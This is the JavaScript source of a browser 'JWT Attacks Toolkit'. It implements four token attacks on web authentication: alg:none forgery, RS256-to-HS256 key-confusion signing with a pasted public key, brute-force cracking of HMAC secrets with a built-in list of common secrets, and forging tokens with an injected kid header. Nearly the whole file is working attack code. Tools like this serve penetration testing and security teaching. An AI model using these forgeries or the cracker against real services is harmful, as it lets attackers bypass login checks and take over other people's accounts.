/* JWT Attacks Toolkit — CyberTools */

let currentHeader = null, currentPayload = null, currentSig = null;

// Base64url helpers
function b64urlEncode(str) {
    return btoa(str).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
}
function b64urlDecode(str) {
    str = str.replace(/-/g,'+').replace(/_/g,'/');
    while (str.length % 4) str += '=';
    return atob(str);
}
function b64urlEncodeBytes(bytes) {
    let bin = '';
    bytes.forEach(b => bin += String.fromCharCode(b));
    return btoa(bin).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
}

function loadToken() {
    const raw = document.getElementById('jwt-input').value.trim();
    const parts = raw.split('.');
    if (parts.length < 2) { alert('Invalid JWT format'); return; }
    try {
        currentHeader = JSON.parse(b64urlDecode(parts[0]));
        currentPayload = JSON.parse(b64urlDecode(parts[1]));
        currentSig = parts[2] || '';
        document.getElementById('token-header').textContent = JSON.stringify(currentHeader, null, 2);
        document.getElementById('token-payload').textContent = JSON.stringify(currentPayload, null, 2);
        document.getElementById('token-info').style.display = '';
    } catch(e) {
        alert('Failed to parse JWT: ' + e.message);
    }
}

// Attack 1: alg:none
function algNone(algValue) {
    if (!currentHeader) { alert('Load a token first'); return; }
    const hdr = Object.assign({}, currentHeader, { alg: algValue });
    const token = b64urlEncode(JSON.stringify(hdr)) + '.' + b64urlEncode(JSON.stringify(currentPayload)) + '.';
    document.getElementById('algnone-token').textContent = token;
    document.getElementById('algnone-out').style.display = '';
}

// Attack 2: RS256 -> HS256
async function rs256toHs256() {
    if (!currentHeader) { alert('Load a token first'); return; }
    const pem = document.getElementById('pem-input').value.trim();
    if (!pem) { alert('Paste an RSA public key PEM'); return; }

    const hdr = Object.assign({}, currentHeader, { alg: 'HS256' });
    const headerB64 = b64urlEncode(JSON.stringify(hdr));
    const payloadB64 = b64urlEncode(JSON.stringify(currentPayload));
    const signingInput = headerB64 + '.' + payloadB64;

    try {
        const keyBytes = new TextEncoder().encode(pem);
        const cryptoKey = await crypto.subtle.importKey('raw', keyBytes, { name:'HMAC', hash:'SHA-256' }, false, ['sign']);
        const sigBytes = await crypto.subtle.sign('HMAC', cryptoKey, new TextEncoder().encode(signingInput));
        const sig = b64urlEncodeBytes(Array.from(new Uint8Array(sigBytes)));
        const token = signingInput + '.' + sig;
        document.getElementById('hs256-token').textContent = token;
        document.getElementById('hs256-out').style.display = '';
    } catch(e) {
        alert('Signing failed: ' + e.message);
    }
}

// Attack 3: Crack weak secret
const BUILTIN_SECRETS = [
    'secret','password','123456','letmein','qwerty','admin','test',
    'your-256-bit-secret','your-secret','mysecret','jwtSecret','jwt_secret',
    'secret123','password123','changeme','supersecret','toomanysecrets',
    'shhhhh','HS256Key','key','private','signing_key','app_secret',
    'RANDOM_SECRET_KEY','SECRET_KEY','my_super_secret','abc123','pass',
    'root','1234','12345','12345678','iloveyou','monkey',
];

function loadBuiltinWordlist() {
    document.getElementById('wordlist').value = BUILTIN_SECRETS.join('\n');
}

async function crack() {
    if (!currentHeader) { alert('Load a token first'); return; }
    if (!currentSig) { alert('Token has no signature'); return; }
    const alg = currentHeader.alg;
    if (!alg || !alg.startsWith('HS')) { alert('Only HS256/HS384/HS512 tokens can be cracked this way'); return; }

    const hashAlg = alg === 'HS512' ? 'SHA-512' : alg === 'HS384' ? 'SHA-384' : 'SHA-256';
    const words = document.getElementById('wordlist').value.split('\n').map(s=>s.trim()).filter(Boolean);
    if (!words.length) { alert('Enter secrets in the wordlist'); return; }

    const rawJwt = document.getElementById('jwt-input').value.trim();
    const parts = rawJwt.split('.');
    const signingInput = parts[0] + '.' + parts[1];
    const enc = new TextEncoder();

    document.getElementById('crack-progress').style.display = '';
    document.getElementById('crack-result').innerHTML = '';

    let found = null;
    for (let i = 0; i < words.length; i++) {
        document.getElementById('crack-bar').style.width = ((i / words.length) * 100) + '%';
        document.getElementById('crack-status').textContent = `Trying ${i+1}/${words.length}: "${words[i]}"`;

        try {
            const key = await crypto.subtle.importKey('raw', enc.encode(words[i]), {name:'HMAC',hash:hashAlg}, false, ['sign']);
            const sig = await crypto.subtle.sign('HMAC', key, enc.encode(signingInput));
            const computed = b64urlEncodeBytes(Array.from(new Uint8Array(sig)));
            if (computed === currentSig) { found = words[i]; break; }
        } catch(e) { continue; }

        if (i % 10 === 0) await new Promise(r => setTimeout(r, 0));
    }

    document.getElementById('crack-bar').style.width = '100%';
    if (found !== null) {
        document.getElementById('crack-status').textContent = '';
        document.getElementById('crack-result').innerHTML = `<div style="background:rgba(0,200,100,0.1);border:1px solid var(--success);border-radius:8px;padding:14px;font-size:14px;"><strong style="color:var(--success);">Secret found!</strong> <code style="font-family:'JetBrains Mono',monospace;color:var(--accent);font-size:15px;">${escHtml(found)}</code></div>`;
    } else {
        document.getElementById('crack-status').textContent = `Tried ${words.length} secrets — not found.`;
        document.getElementById('crack-result').innerHTML = `<div style="color:var(--text-muted);font-size:13px;">Secret not in wordlist. Try a larger wordlist or different approach.</div>`;
    }
}

// Attack 4: kid injection
function setKid(val) {
    document.getElementById('kid-value').value = val;
}

function forgeKid() {
    if (!currentHeader) { alert('Load a token first'); return; }
    const kid = document.getElementById('kid-value').value;
    const hdr = Object.assign({}, currentHeader, { kid, alg: 'none' });
    const token = b64urlEncode(JSON.stringify(hdr)) + '.' + b64urlEncode(JSON.stringify(currentPayload)) + '.';
    document.getElementById('kid-token').textContent = token;
    document.getElementById('kid-out').style.display = '';
}

function copyEl(id) {
    const text = document.getElementById(id).textContent;
    navigator.clipboard.writeText(text).catch(() => {});
}

function escHtml(s) {
    const d = document.createElement('div');
    d.textContent = s;
    return d.innerHTML;
}
